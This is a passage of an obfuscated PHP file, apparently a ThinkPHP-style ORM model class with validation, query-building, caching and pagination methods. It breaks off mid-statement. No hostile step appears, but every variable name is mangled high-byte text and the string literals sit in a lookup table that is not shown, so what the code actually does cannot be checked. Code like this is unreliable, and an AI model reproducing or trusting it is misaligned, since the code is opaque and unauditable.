autoCheckToken($³Š—ñ  ) { $´ãéóÏé =& $_SERVER[¹ş¤¶ĞÖ]; if (isset($this->options[$´ãéóÏé[330]]) && !$this->options[$´ãéóÏé[330]]) { return !0; } if (think_config($´ãéóÏé[327])) { $º€ü‘¹µ = think_config($´ãéóÏé[328]); if (!isset($³Š—ñ  [$º€ü‘¹µ]) || Session::get($º€ü‘¹µ)) { return !1; } list($¥ÃıÏ«‡, $ŸÚ¼¤‘’) = explode($´ãéóÏé[11], $³Š—ñ  [$º€ü‘¹µ]); if ($ŸÚ¼¤‘’ && Session::get($º€ü‘¹µ . $´ãéóÏé[10] . $¥ÃıÏ«‡) === $ŸÚ¼¤‘’) { Session::remove($º€ü‘¹µ . $´ãéóÏé[10] . $¥ÃıÏ«‡); return !0; } if (think_config($´ãéóÏé[331])) { Session::remove($º€ü‘¹µ . $´ãéóÏé[10] . $¥ÃıÏ«‡); } return !1; } return !0; } public function regex($Şºåõ, $†à—ÔÊù) { $¯ÀÁ¹åÅ =& $_SERVER[¹ş¤¶ĞÖ]; $–µÒå” = array($¯ÀÁ¹åÅ[332] => $¯ÀÁ¹åÅ[333], $¯ÀÁ¹åÅ[334] => $¯ÀÁ¹åÅ[335], $¯ÀÁ¹åÅ[336] => $¯ÀÁ¹åÅ[337], $¯ÀÁ¹åÅ[338] => $¯ÀÁ¹åÅ[339], $¯ÀÁ¹åÅ[340] => $¯ÀÁ¹åÅ[341], $¯ÀÁ¹åÅ[342] => $¯ÀÁ¹åÅ[343], $¯ÀÁ¹åÅ[344] => $¯ÀÁ¹åÅ[345], $¯ÀÁ¹åÅ[319] => $¯ÀÁ¹åÅ[346], $¯ÀÁ¹åÅ[347] => $¯ÀÁ¹åÅ[348]); if (isset($–µÒå”[strtolower($†à—ÔÊù)])) { $†à—ÔÊù = $–µÒå”[strtolower($†à—ÔÊù)]; } return preg_match($†à—ÔÊù, $Şºåõ) === 1; } private function autoOperation(&$ìåÔÈÖï, $ŒÆÎ´Î„) { $Ëù¿à›“ =& $_SERVER[¹ş¤¶ĞÖ]; if (!empty($this->options[$Ëù¿à›“[349]])) { $ˆÜèóğ = $this->options[$Ëù¿à›“[349]]; unset($this->options[$Ëù¿à›“[349]]); } elseif (!empty($this->_auto)) { $ˆÜèóğ = $this->_auto; } if (isset($ˆÜèóğ)) { foreach ($ˆÜèóğ as $ìç“Ò„Ó) { if (empty($ìç“Ò„Ó[2])) { $ìç“Ò„Ó[2] = THINK_MODEL_INSERT; } if ($ŒÆÎ´Î„ == $ìç“Ò„Ó[2] || $ìç“Ò„Ó[2] == THINK_MODEL_BOTH) { switch (trim($ìç“Ò„Ó[3])) { case $Ëù¿à›“[350]: case $Ëù¿à›“[351]: $ø¾…Ïñß = isset($ìç“Ò„Ó[4]) ? (array) $ìç“Ò„Ó[4] : array(); if (isset($ìåÔÈÖï[$ìç“Ò„Ó[0]])) { array_unshift($ø¾…Ïñß, $ìåÔÈÖï[$ìç“Ò„Ó[0]]); } if ($Ëù¿à›“[350] == $ìç“Ò„Ó[3]) { $ìåÔÈÖï[$ìç“Ò„Ó[0]] = call_user_func_array($ìç“Ò„Ó[1], $ø¾…Ïñß); } else { $ìåÔÈÖï[$ìç“Ò„Ó[0]] = call_user_func_array(array(&$this, $ìç“Ò„Ó[1]), $ø¾…Ïñß); } break; case $Ëù¿à›“[302]: $ìåÔÈÖï[$ìç“Ò„Ó[0]] = $ìåÔÈÖï[$ìç“Ò„Ó[1]]; break; case $Ëù¿à›“[352]: if ($Ëù¿à›“[12] === $ìåÔÈÖï[$ìç“Ò„Ó[0]]) { unset($ìåÔÈÖï[$ìç“Ò„Ó[0]]); } break; case $Ëù¿à›“[353]: default: $ìåÔÈÖï[$ìç“Ò„Ó[0]] = $ìç“Ò„Ó[1]; } if (!1 === $ìåÔÈÖï[$ìç“Ò„Ó[0]]) { unset($ìåÔÈÖï[$ìç“Ò„Ó[0]]); } } } } return $ìåÔÈÖï; } protected function autoValidation($ÜÊõ’é, $€”‚Òõ) { $…œæĞô± =& $_SERVER[¹ş¤¶ĞÖ]; if (!empty($this->options[$…œæĞô±[354]])) { $Ú™‹áøÚ = $this->options[$…œæĞô±[354]]; unset($this->options[$…œæĞô±[354]]); } elseif (!empty($this->_validate)) { $Ú™‹áøÚ = $this->_validate; } if (isset($Ú™‹áøÚ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($Ú™‹áøÚ as $¢¾Æ¢ñ÷ => $Ëƒ­¹ê) { if (empty($Ëƒ­¹ê[5]) || $Ëƒ­¹ê[5] == THINK_MODEL_BOTH || $Ëƒ­¹ê[5] == $€”‚Òõ) { if (0 == strpos($Ëƒ­¹ê[2], $…œæĞô±[355]) && strpos($Ëƒ­¹ê[2], $…œæĞô±[356])) { $Ëƒ­¹ê[2] = think_lang(substr($Ëƒ­¹ê[2], 2, -1)); } $Ëƒ­¹ê[3] = isset($Ëƒ­¹ê[3]) ? $Ëƒ­¹ê[3] : THINK_EXISTS_VALIDATE; $Ëƒ­¹ê[4] = isset($Ëƒ­¹ê[4]) ? $Ëƒ­¹ê[4] : $…œæĞô±[357]; switch ($Ëƒ­¹ê[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ÜÊõ’é, $Ëƒ­¹ê)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($…œæĞô±[12] != trim($ÜÊõ’é[$Ëƒ­¹ê[0]])) { if (!1 === $this->_validationField($ÜÊõ’é, $Ëƒ­¹ê)) { return !1; } } break; default: if (isset($ÜÊõ’é[$Ëƒ­¹ê[0]])) { if (!1 === $this->_validationField($ÜÊõ’é, $Ëƒ­¹ê)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($†«óâ˜, $óøåºú) { if (!1 === $this->_validationFieldItem($†«óâ˜, $óøåºú)) { if ($this->patchValidate) { $this->error[$óøåºú[0]] = $óøåºú[2]; } else { $this->error = $óøåºú[2]; return !1; } } return; } protected function _validationFieldItem($á¯Ç, $›Ö±±¹) { $·¦½õÁµ =& $_SERVER[¹ş¤¶ĞÖ]; switch (strtolower(trim($›Ö±±¹[4]))) { case $·¦½õÁµ[350]: case $·¦½õÁµ[351]: $‡‚Ùö œ = isset($›Ö±±¹[6]) ? (array) $›Ö±±¹[6] : array(); if (is_string($›Ö±±¹[0]) && strpos($›Ö±±¹[0], $·¦½õÁµ[50])) { $›Ö±±¹[0] = explode($·¦½õÁµ[50], $›Ö±±¹[0]); } if (is_array($›Ö±±¹[0])) { foreach ($›Ö±±¹[0] as $İ‹÷œÚ) { $Ş±Šâ«Ü[$İ‹÷œÚ] = $á¯Ç[$İ‹÷œÚ]; } array_unshift($‡‚Ùö œ, $Ş±Šâ«Ü); } else { array_unshift($‡‚Ùö œ, $á¯Ç[$›Ö±±¹[0]]); } if ($·¦½õÁµ[350] == $›Ö±±¹[4]) { return call_user_func_array($›Ö±±¹[1], $‡‚Ùö œ); } else { return call_user_func_array(array(&$this, $›Ö±±¹[1]), $‡‚Ùö œ); } case $·¦½õÁµ[358]: return $á¯Ç[$›Ö±±¹[0]] == $á¯Ç[$›Ö±±¹[1]]; case $·¦½õÁµ[359]: if (is_string($›Ö±±¹[0]) && strpos($›Ö±±¹[0], $·¦½õÁµ[50])) { $›Ö±±¹[0] = explode($·¦½õÁµ[50], $›Ö±±¹[0]); } $ù€¹í = array(); if (is_array($›Ö±±¹[0])) { foreach ($›Ö±±¹[0] as $İ‹÷œÚ) { $ù€¹í[$İ‹÷œÚ] = $á¯Ç[$İ‹÷œÚ]; } } else { $ù€¹í[$›Ö±±¹[0]] = $á¯Ç[$›Ö±±¹[0]]; } if (!empty($á¯Ç[$this->getPk()])) { $ù€¹í[$this->getPk()] = array($·¦½õÁµ[360], $á¯Ç[$this->getPk()]); } if ($this->where($ù€¹í)->find()) { return !1; } return !0; default: return $this->check($á¯Ç[$›Ö±±¹[0]], $›Ö±±¹[1], $›Ö±±¹[4]); } } public function check($µøÆ¤©å, $±¿¹Å„, $¼…›¨Â÷ = "\162\145\x67\145\170") { $…Û”ĞØÁ =& $_SERVER[¹ş¤¶ĞÖ]; $¼…›¨Â÷ = strtolower(trim($¼…›¨Â÷)); switch ($¼…›¨Â÷) { case $…Û”ĞØÁ[7]: case $…Û”ĞØÁ[361]: $°ÊóÑ¡¥ = is_array($±¿¹Å„) ? $±¿¹Å„ : explode($…Û”ĞØÁ[50], $±¿¹Å„); return $¼…›¨Â÷ == $…Û”ĞØÁ[7] ? in_array($µøÆ¤©å, $°ÊóÑ¡¥) : !in_array($µøÆ¤©å, $°ÊóÑ¡¥); case $…Û”ĞØÁ[362]: case $…Û”ĞØÁ[363]: if (is_array($±¿¹Å„)) { $ô†‘¶Š = $±¿¹Å„[0]; $§ÈÛ…Å¸ = $±¿¹Å„[1]; } else { list($ô†‘¶Š, $§ÈÛ…Å¸) = explode($…Û”ĞØÁ[50], $±¿¹Å„); } return $¼…›¨Â÷ == $…Û”ĞØÁ[362] ? $µøÆ¤©å >= $ô†‘¶Š && $µøÆ¤©å <= $§ÈÛ…Å¸ : $µøÆ¤©å < $ô†‘¶Š || $µøÆ¤©å > $§ÈÛ…Å¸; case $…Û”ĞØÁ[364]: case $…Û”ĞØÁ[365]: return $¼…›¨Â÷ == $…Û”ĞØÁ[364] ? $µøÆ¤©å == $±¿¹Å„ : $µøÆ¤©å != $±¿¹Å„; case $…Û”ĞØÁ[366]: $»Ûù€½× = mb_strlen($µøÆ¤©å, $…Û”ĞØÁ[367]); if (strpos($±¿¹Å„, $…Û”ĞØÁ[50])) { list($ô†‘¶Š, $§ÈÛ…Å¸) = explode($…Û”ĞØÁ[50], $±¿¹Å„); return $»Ûù€½× >= $ô†‘¶Š && $»Ûù€½× <= $§ÈÛ…Å¸; } else { return $»Ûù€½× == $±¿¹Å„; } case $…Û”ĞØÁ[368]: list($áÂ¨—ÛÄ, $è›²îÃô) = explode($…Û”ĞØÁ[50], $±¿¹Å„); if (!is_numeric($áÂ¨—ÛÄ)) { $áÂ¨—ÛÄ = strtotime($áÂ¨—ÛÄ); } if (!is_numeric($è›²îÃô)) { $è›²îÃô = strtotime($è›²îÃô); } return NOW_TIME >= $áÂ¨—ÛÄ && NOW_TIME <= $è›²îÃô; case $…Û”ĞØÁ[369]: return in_array(get_client_ip(), explode($…Û”ĞØÁ[50], $±¿¹Å„)); case $…Û”ĞØÁ[370]: return !in_array(get_client_ip(), explode($…Û”ĞØÁ[50], $±¿¹Å„)); case $…Û”ĞØÁ[357]: default: return $this->regex($µøÆ¤©å, $±¿¹Å„); } } public function query($Ú—Éù³®, $¸ı»óÅ§ = false) { $é§Á†ÜÉ =& $_SERVER[¹ş¤¶ĞÖ]; if (!is_bool($¸ı»óÅ§) && !is_array($¸ı»óÅ§)) { $¸ı»óÅ§ = func_get_args(); array_shift($¸ı»óÅ§); } $Ú—Éù³® = str_replace(array($é§Á†ÜÉ[231], $é§Á†ÜÉ[371]), $é§Á†ÜÉ[53], $Ú—Éù³®); $Ú—Éù³® = $this->parseSql($Ú—Éù³®, $¸ı»óÅ§); return $this->db->query($Ú—Éù³®); } public function execute($àé¯àï¾, $ş ¹¢„ = false) { if (!is_bool($ş ¹¢„) && !is_array($ş ¹¢„)) { $ş ¹¢„ = func_get_args(); array_shift($ş ¹¢„); } $àé¯àï¾ = $this->parseSql($àé¯àï¾, $ş ¹¢„); return $this->db->execute($àé¯àï¾); } protected function parseSql($Ÿ…æáÖÍ, $“Ù¥ëé) { $‹Î²ğ =& $_SERVER[¹ş¤¶ĞÖ]; if (!0 === $“Ù¥ëé) { $ÊÀÕ–„ = $this->_parseOptions(); $Ÿ…æáÖÍ = $this->db->parseSql($Ÿ…æáÖÍ, $ÊÀÕ–„); } elseif (is_array($“Ù¥ëé)) { $“Ù¥ëé = array_map(array($this->db, $‹Î²ğ[372]), $“Ù¥ëé); $Ÿ…æáÖÍ = vsprintf($Ÿ…æáÖÍ, $“Ù¥ëé); } else { $Ÿ…æáÖÍ = strtr($Ÿ…æáÖÍ, array($‹Î²ğ[373] => $this->getTableName(), $‹Î²ğ[374] => think_config($‹Î²ğ[273]))); } $this->db->setModel($this->name); return $Ÿ…æáÖÍ; } public function db($“äÖ¦” = '', $ÕöÍ±ßŠ = '', $ÃîŸÒˆ = array()) { $¿µ®×´æ =& $_SERVER[¹ş¤¶ĞÖ]; if ($¿µ®×´æ[12] === $“äÖ¦” && $this->db) { return $this->db; } static $çÖ¤¬–Ÿ = array(); static $óéñ¤Â = array(); if (!isset($óéñ¤Â[$“äÖ¦”]) || isset($óéñ¤Â[$“äÖ¦”]) && $ÕöÍ±ßŠ && $çÖ¤¬–Ÿ[$“äÖ¦”] != $ÕöÍ±ßŠ) { if (!empty($ÕöÍ±ßŠ) && is_string($ÕöÍ±ßŠ) && !1 === strpos($ÕöÍ±ßŠ, $¿µ®×´æ[8])) { $ÕöÍ±ßŠ = think_config($ÕöÍ±ßŠ); } $“äÖ¦” = think_guid($ÕöÍ±ßŠ); $óéñ¤Â[$“äÖ¦”] = Db::getInstance($ÕöÍ±ßŠ); } elseif (NULL === $ÕöÍ±ßŠ) { $óéñ¤Â[$“äÖ¦”]->close(); unset($óéñ¤Â[$“äÖ¦”]); return; } if (!empty($ÃîŸÒˆ)) { if (is_string($ÃîŸÒˆ)) { parse_str($ÃîŸÒˆ, $ÃîŸÒˆ); } foreach ($ÃîŸÒˆ as $ÔØ‡Ÿ© => $ĞàÒ¨êÅ) { $this->setProperty($ÔØ‡Ÿ©, $ĞàÒ¨êÅ); } } $çÖ¤¬–Ÿ[$“äÖ¦”] = $ÕöÍ±ßŠ; $this->db = $óéñ¤Â[$“äÖ¦”]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ÊÓä¦ı = get_class($this); if ($ÊÓä¦ı == $_SERVER[¹ş¤¶ĞÖ][375]) { return $this->name; } $this->name = substr($ÊÓä¦ı, 0, -5); } return $this->name; } public function getTableName() { $ôôÆÖ¶õ =& $_SERVER[¹ş¤¶ĞÖ]; if (empty($this->trueTableName)) { $²¾Ù›äí = !empty($this->tablePrefix) ? $this->tablePrefix : $ôôÆÖ¶õ[12]; if (!empty($this->tableName)) { $²¾Ù›äí .= $this->tableName; } else { $²¾Ù›äí .= think_parse_name($this->name); } $this->trueTableName = strtolower($²¾Ù›äí); } return (!empty($this->dbName) ? $this->dbName . $ôôÆÖ¶õ[10] : $ôôÆÖ¶õ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ÈÖ–³ì¨ =& $_SERVER[¹ş¤¶ĞÖ]; return isset($this->fields[$ÈÖ–³ì¨[280]]) ? $this->fields[$ÈÖ–³ì¨[280]] : $this->pk; } public function getDbFields() { $ô‘ÜÓôà =& $_SERVER[¹ş¤¶ĞÖ]; if (isset($this->options[$ô‘ÜÓôà[308]])) { $Èš´Úš = $this->db->getFields($this->options[$ô‘ÜÓôà[308]]); return $Èš´Úš ? array_keys($Èš´Úš) : !1; } if ($this->fields) { $Èš´Úš = $this->fields; unset($Èš´Úš[$ô‘ÜÓôà[279]], $Èš´Úš[$ô‘ÜÓôà[280]], $Èš´Úš[$ô‘ÜÓôà[281]], $Èš´Úš[$ô‘ÜÓôà[278]]); return $Èš´Úš; } return !1; } public function data($ƒ›ˆ¢Ò = '') { $ëïÁÅŸÓ =& $_SERVER[¹ş¤¶ĞÖ]; if ($ëïÁÅŸÓ[12] === $ƒ›ˆ¢Ò && !empty($this->data)) { return $this->data; } if (is_object($ƒ›ˆ¢Ò)) { $ƒ›ˆ¢Ò = get_object_vars($ƒ›ˆ¢Ò); } elseif (is_string($ƒ›ˆ¢Ò)) { parse_str($ƒ›ˆ¢Ò, $ƒ›ˆ¢Ò); } elseif (!is_array($ƒ›ˆ¢Ò)) { think_exception(think_lang($ëïÁÅŸÓ[300])); } $this->data = $ƒ›ˆ¢Ò; return $this; } public function join($¶˜Ş“´Î) { $İ† ÈÎŸ =& $_SERVER[¹ş¤¶ĞÖ]; if (is_array($¶˜Ş“´Î)) { $this->options[$İ† ÈÎŸ[311]] = $¶˜Ş“´Î; } elseif (!empty($¶˜Ş“´Î)) { $this->options[$İ† ÈÎŸ[311]][] = $¶˜Ş“´Î; } return $this; } public function union($ì•×¡êà, $Œ©£“ù¢ = false) { $£Õ°´‡ö =& $_SERVER[¹ş¤¶ĞÖ]; if (empty($ì•×¡êà)) { return $this; } if ($Œ©£“ù¢) { $this->options[$£Õ°´‡ö[376]][$£Õ°´‡ö[377]] = !0; } if (is_object($ì•×¡êà)) { $ì•×¡êà = get_object_vars($ì•×¡êà); } if (is_string($ì•×¡êà)) { $è›ôˆ¸ = $ì•×¡êà; } elseif (is_array($ì•×¡êà)) { if (isset($ì•×¡êà[0])) { $this->options[$£Õ°´‡ö[376]] = array_merge($this->options[$£Õ°´‡ö[376]], $ì•×¡êà); return $this; } else { $è›ôˆ¸ = $ì•×¡êà; } } else { think_exception(think_lang($£Õ°´‡ö[300])); } $this->options[$£Õ°´‡ö[376]][] = $è›ôˆ¸; return $this; } public function cache($‘ÂÃİºª = true, $™ŞÁ¸üå = null, $Ç¿±Ã  = '') { $¼¯è´³ë =& $_SERVER[¹ş¤¶ĞÖ]; if (!1 !== $‘ÂÃİºª) { $this->options[$¼¯è´³ë[378]] = array($¼¯è´³ë[94] => $‘ÂÃİºª, $¼¯è´³ë[368] => $™ŞÁ¸üå, $¼¯è´³ë[33] => $Ç¿±Ã ); } return $this; } public function field($ŞœÀ¸¿«, $†ä¿õÏ¼ = false) { $˜Ù·³‰  =& $_SERVER[¹ş¤¶ĞÖ]; if (!0 === $ŞœÀ¸¿«) { $áÒº…¤ß = $this->getDbFields(); $ŞœÀ¸¿« = $áÒº…¤ß ? $áÒº…¤ß : $˜Ù·³‰ [189]; } elseif ($†ä¿õÏ¼) { if (is_string($ŞœÀ¸¿«)) { $ŞœÀ¸¿« = explode($˜Ù·³‰ [50], $ŞœÀ¸¿«); } $áÒº…¤ß = $this->getDbFields(); $ŞœÀ¸¿« = $áÒº…¤ß ? array_diff($áÒº…¤ß, $ŞœÀ¸¿«) : $ŞœÀ¸¿«; } $this->options[$˜Ù·³‰ [302]] = $ŞœÀ¸¿«; return $this; } public function scope($“¤û¶¯¶ = '', $óë§Ö²ı = NULL) { $Œò™ø¨Ó =& $_SERVER[¹ş¤¶ĞÖ]; if ($Œò™ø¨Ó[12] === $“¤û¶¯¶) { if (isset($this->_scope[$Œò™ø¨Ó[37]])) { $ƒÆÌå¼ƒ = $this->_scope[$Œò™ø¨Ó[37]]; } else { return $this; } } elseif (is_string($“¤û¶¯¶)) { $›äâ©Şª = explode($Œò™ø¨Ó[50], $“¤û¶¯¶); $ƒÆÌå¼ƒ = array(); foreach ($›äâ©Şª as $ŠŞÍ˜¤) { if (!isset($this->_scope[$ŠŞÍ˜¤])) { continue; } $ƒÆÌå¼ƒ = array_merge($ƒÆÌå¼ƒ, $this->_scope[$ŠŞÍ˜¤]); } if (!empty($óë§Ö²ı) && is_array($óë§Ö²ı)) { $ƒÆÌå¼ƒ = array_merge($ƒÆÌå¼ƒ, $óë§Ö²ı); } } elseif (is_array($“¤û¶¯¶)) { $ƒÆÌå¼ƒ = $“¤û¶¯¶; } if (is_array($ƒÆÌå¼ƒ) && !empty($ƒÆÌå¼ƒ)) { $this->options = array_merge($this->options, array_change_key_case($ƒÆÌå¼ƒ)); } return $this; } public function where($ÓÜ’™¹, $Äóø¡‡¢ = null) { $çÓ¿Ä†® =& $_SERVER[¹ş¤¶ĞÖ]; if (!is_null($Äóø¡‡¢) && is_string($ÓÜ’™¹)) { if (!is_array($Äóø¡‡¢)) { $Äóø¡‡¢ = func_get_args(); array_shift($Äóø¡‡¢); } $Äóø¡‡¢ = array_map(array($this->db, $çÓ¿Ä†®[372]), $Äóø¡‡¢); $ÓÜ’™¹ = vsprintf($ÓÜ’™¹, $Äóø¡‡¢); } elseif (is_object($ÓÜ’™¹)) { $ÓÜ’™¹ = get_object_vars($ÓÜ’™¹); } elseif (is_array($ÓÜ’™¹)) { foreach ($ÓÜ’™¹ as $î¢âü—˜ => $— Í¶‡) { if ((is_numeric($î¢âü—˜) || !$î¢âü—˜) && is_string($— Í¶‡)) { if (strpos($— Í¶‡, $çÓ¿Ä†®[379]) === 0) { continue; } think_trace($çÓ¿Ä†®[380], $çÓ¿Ä†®[12], $çÓ¿Ä†®[49]); die; } } } if (is_string($ÓÜ’™¹) && $çÓ¿Ä†®[12] != $ÓÜ’™¹) { $¶¤£ÈåÛ = array(); $¶¤£ÈåÛ[$çÓ¿Ä†®[381]] = $ÓÜ’™¹; $ÓÜ’™¹ = $¶¤£ÈåÛ; } if (isset($this->options[$çÓ¿Ä†®[304]])) { $this->options[$çÓ¿Ä†®[304]] = array_merge($this->options[$çÓ¿Ä†®[304]], $ÓÜ’™¹); } else { $this->options[$çÓ¿Ä†®[304]] = $ÓÜ’™¹; } return $this; } public function limit($óÛ„­ĞÀ, $Îœ×èá¶ = null) { $İœ¦‹­µ =& $_SERVER[¹ş¤¶ĞÖ]; $this->options[$İœ¦‹­µ[321]] = is_null($Îœ×èá¶) ? $óÛ„­ĞÀ : $óÛ„­ĞÀ . $İœ¦‹­µ[50] . $Îœ×èá¶; return $this; } public function page($Ùß½Õ¯˜, $¤œŠù³Ö = null) { $ÒÉ©´§ =& $_SERVER[¹ş¤¶ĞÖ]; $this->options[$ÒÉ©´§[382]] = is_null($¤œŠù³Ö) ? $Ùß½Õ¯˜ : $Ùß½Õ¯˜ . $ÒÉ©´§[50] . $¤œŠù³Ö; return $this; } public function comment($Ğ‰­ÖÀç) { $this->options[$_SERVER[¹ş¤¶ĞÖ][383]] = $Ğ‰­ÖÀç; return $this; } public function setProperty($Ö­íöòœ, $°Ù Š˜) { if (property_exists($this, $Ö­íöòœ)) { $this->{$Ö­íöòœ} = $°Ù Š˜; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\144\151\146\171\124\x69\x6d\145", "\164\151\x6d\145", "\x69\x6e\163\145\x72\164\x2c\165\x70\x64\x61\x74\145", "\146\165\156\x63\164\151\157\156"), array("\x63\x72\145\x61\x74\145\x54\x69\x6d\x65", "\x74\151\x6d\x65", "\x69\156\163\x65\x72\x74", "\146\x75\x6e\143\x74\151\x6f\156")); public function setDataAuto($Ÿºòó×¼) { $this->dataAuto = $Ÿºòó×¼; } public function __construct($ßÊéæê = '', $¤”äÀ‰õ = '', $Óá“ßİ = '') { parent::__construct($ßÊéæê, $¤”äÀ‰õ, $Óá“ßİ); } protected $tableMeta = array(); protected function _beforeInsert(&$ã§‘õµ², $…Çöß») { $Å°ñÎÖ· =& $_SERVER[¹ş¤¶ĞÖ]; if (!$this->checkDataAutoHas($Å°ñÎÖ·[384])) { return; } $this->dataBeforeFilter($ã§‘õµ², $Å°ñÎÖ·[384]); } protected function _beforeUpdate(&$à«” ç, $û‡ÔÕ¾æ) { $°õëùéç =& $_SERVER[¹ş¤¶ĞÖ]; if (!$this->checkDataAutoHas($°õëùéç[385])) { return; } $this->dataBeforeFilter($à«” ç, $°õëùéç[385]); } protected function _afterSelect(&$Ş½íıì, $´ˆ¤ì¹) { if (!is_array($Ş½íıì)) { return; } if (!$this->checkDataAutoHas($_SERVER[¹ş¤¶ĞÖ][386])) { return; } foreach ($Ş½íıì as &$‘€Á÷Ê) { $this->dataAfterFilter($‘€Á÷Ê); } unset($‘€Á÷Ê); } protected function _afterFind(&$Ğ«²‡ñ¶, $Á›•šÙ) { if (!is_array($Ğ«²‡ñ¶)) { return; } if (!$this->checkDataAutoHas($_SERVER[¹ş¤¶ĞÖ][386])) { return; } $this->dataAfterFilter($Ğ«²‡ñ¶); } public static function textEncode($İóØï‡›) { if (!$İóØï‡›) { return $İóØï‡›; } $»­¯—®´ = json_encode($İóØï‡›); $»­¯—®´ = preg_replace_callback($_SERVER[¹ş¤¶ĞÖ][387], function ($Ë€šè) { return addslashes($Ë€šè[0]); }, $»­¯—®´); return json_decode($»­¯—®´); } public static function textDecode($ÅÇ›şÌŠ) { $ìĞê…Î³ =& $_SERVER[¹ş¤¶ĞÖ]; $¸›Êº = json_encode($ÅÇ›şÌŠ); $¸›Êº = preg_replace_callback($ìĞê…Î³[388], function ($–ÖßåòÕ) { return $_SERVER[¹ş¤¶ĞÖ][97]; }, $¸›Êº); return json_decode($¸›Êº); } public function setAutoIncrement($²Áò½ğÉ) { $Ãö‹—ïŠ = array($this->getPk() => $²Áò½ğÉ); $…§š—ÓÏ = $this->data($Ãö‹—ïŠ)->add(); if ($…§š—ÓÏ) { $this->delete($…§š—ÓÏ); } } public function getAutoIncrement() { $ßŸŒ‰È = $this->getTableName(); $Ï¨—«çš = $this->max($this->getPk()); $Å¢Ñ½Ö = $this->query("\x73\x68\x6f\167\40\164\x61\x62\154\x65\x20\x73\x74\141\x74\165\163\40\167\150\x65\x72\145\x20\x4e\x61\x6d\x65\75\47{$ßŸŒ‰È}\47"); $¡¹‹ÍŞÅ = $Å¢Ñ½Ö[0][$_SERVER[¹ş¤¶ĞÖ][389]]; $Õ°…î = max($Ï¨—«çš, $¡¹‹ÍŞÅ); return $Õ°…î; } protected function _callBefore($ßâ½áı, $äöçì”È) { return $this->cacheCallCheck($ßâ½áı, $äöçì”È, !1); } protected function _callAfter($á ßŞÇÇ, $×Øıœš) { return $this->cacheCallCheck($á ßŞÇÇ, $×Øıœš, !0); } protected function cacheFunctionAlias($À‘¤»÷) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($¸ˆ Òà¡, $ÜÍœØ›Ö, $•¯Å–Êš = false) { $æóĞÕ®€ = $this->cacheFunctionAlias($ÜÍœØ›Ö); if (!$æóĞÕ®€) { return; } foreach ($æóĞÕ®€ as $¥è¥Ï ¯ => $ı¥ı•˜°) { $«¦áåÑú = $ı¥ı•˜°[0]; $ÁÓëİó = explode($_SERVER[¹ş¤¶ĞÖ][50], $ı¥ı•˜°[1]); if ($¸ˆ Òà¡ == $¥è¥Ï ¯) { return $this->cacheFunctionGet($¥è¥Ï ¯, $«¦áåÑú); } if ($•¯Å–Êš && in_array($¸ˆ Òà¡, $ÁÓëİó)) { $this->cacheFunctionClear($¥è¥Ï ¯, $«¦áåÑú); } } } public function cacheFunctionGet($Î¿…†®€, $³å¥Œ³õ) { $†’¡©Ñë = $this->cacheKeyMake($Î¿…†®€, $³å¥Œ³õ); $“âş¿û± = Cache::get($†’¡©Ñë); if (!is_array($“âş¿û±)) { $“âş¿û± = call_user_func_array(array($this, $Î¿…†®€), array($³å¥Œ³õ, !0)); Cache::set($†’¡©Ñë, $“âş¿û±); } return $“âş¿û±; } public function cacheFunctionClear($ì×€Ô“Õ, $±šÖ´Í) { $¤ÓÀœşù = $±šÖ´Í; if (!is_array($±šÖ´Í)) { $¤ÓÀœşù = array($±šÖ´Í); } foreach ($¤ÓÀœşù as $ùÆÁ‰Æ†) { $î­ğ¥¹¢ = $this->cacheKeyMake($ì×€Ô“Õ, $ùÆÁ‰Æ†); Cache::remove($î­ğ¥¹¢); } } private function cacheKeyMake($‰Ò§åğæ, $†ñù®úï) { $Îè÷ı› =& $_SERVER[¹ş¤¶ĞÖ]; return get_class($this) . $Îè÷ı›[11] . $‰Ò§åğæ . $Îè÷ı›[390] . $†ñù®úï; } protected function selectPageReset() { $Şìª·É =& $_SERVER[¹ş¤¶ĞÖ]; if (isset($GLOBALS[$Şìª·É[391]])) { return; } $GLOBALS[$Şìª·É[391]] = isset($GLOBALS[$Şìª·É[7]][$Şìª·É[392]]) ? $GLOBALS[$Şìª·É[7]][$Şìª·É[392]] : !1; $GLOBALS[$Şìª·É[393]] = isset($GLOBALS[$Şìª·É[7]][$Şìª·É[382]]) ? $GLOBALS[$Şìª·É[7]][$Şìª·É[382]] : !1; $GLOBALS[$Şìª·É[7]][$Şìª·É[392]] = !1; $GLOBALS[$Şìª·É[7]][$Şìª·É[382]] = !1; } protected function selectPageRestore() { $À¨‡ä²Ÿ =& $_SERVER[¹ş¤¶ĞÖ]; if (!isset($GLOBALS[$À¨‡ä²Ÿ[391]])) { return; } $GLOBALS[$À¨‡ä²Ÿ[7]][$À¨‡ä²Ÿ[392]] = $GLOBALS[$À¨‡ä²Ÿ[391]]; $GLOBALS[$À¨‡ä²Ÿ[7]][$À¨‡ä²Ÿ[382]] = $GLOBALS[$À¨‡ä²Ÿ[393]]; if ($GLOBALS[$À¨‡ä²Ÿ[7]][$À¨‡ä²Ÿ[392]] === !1) { unset($GLOBALS[$À¨‡ä²Ÿ[7]][$À¨‡ä²Ÿ[392]]); } if ($GLOBALS[$À¨‡ä²Ÿ[7]][$À¨‡ä²Ÿ[382]] === !1) { unset($GLOBALS[$À¨‡ä²Ÿ[7]][$À¨‡ä²Ÿ[382]]); } unset($GLOBALS[$À¨‡ä²Ÿ[391]]); unset($GLOBALS[$À¨‡ä²Ÿ[393]]); } protected function selectPage($í—ü¯± = 200, $ŸáúòÀõ = 1) { $¦¼ª€™„ =& $_SERVER[¹ş¤¶ĞÖ]; global $in; $ÆËŞ¸Û = $this->optionsValue(); $Á¡îœİÉ = 50000; $í—ü¯± = isset($in[$¦¼ª€™„[392]]) && $in[$¦¼ª€™„[392]] ? 